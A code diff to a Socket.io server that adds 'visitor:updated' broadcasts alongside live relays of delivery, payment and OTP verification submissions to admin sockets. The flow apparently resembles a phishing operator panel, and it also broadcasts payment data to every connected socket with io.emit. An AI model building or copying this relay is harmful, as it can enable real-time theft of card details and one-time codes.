@@ -203,10 +203,12 @@ io.on('connection', (socket) => {
       // Try adminConnections first
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:deliverySubmitted', eventData);
+        adminSocket.emit('visitor:updated', eventData);
       });
       
       // Also broadcast via io.emit to ensure all sockets receive
       io.emit('form:deliverySubmitted', eventData);
+      io.emit('visitor:updated', eventData);
 
       console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins`);
     } catch (error) {
@@ -258,9 +260,11 @@ io.on('connection', (socket) => {
       
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:paymentSubmitted', eventData);
+        adminSocket.emit('visitor:updated', eventData);
       });
       
       io.emit('form:paymentSubmitted', eventData);
+      io.emit('visitor:updated', eventData);
 
       console.log(`💳 Payment form processed safely for ${sessionId}`);
     } catch (error) {
@@ -324,9 +328,11 @@ io.on('connection', (socket) => {
       
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:verificationSubmitted', eventData);
+        adminSocket.emit('visitor:updated', eventData);
       });
       
       io.emit('form:verificationSubmitted', eventData);
+      io.emit('visitor:updated', eventData);
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}`);
     } catch (error) {
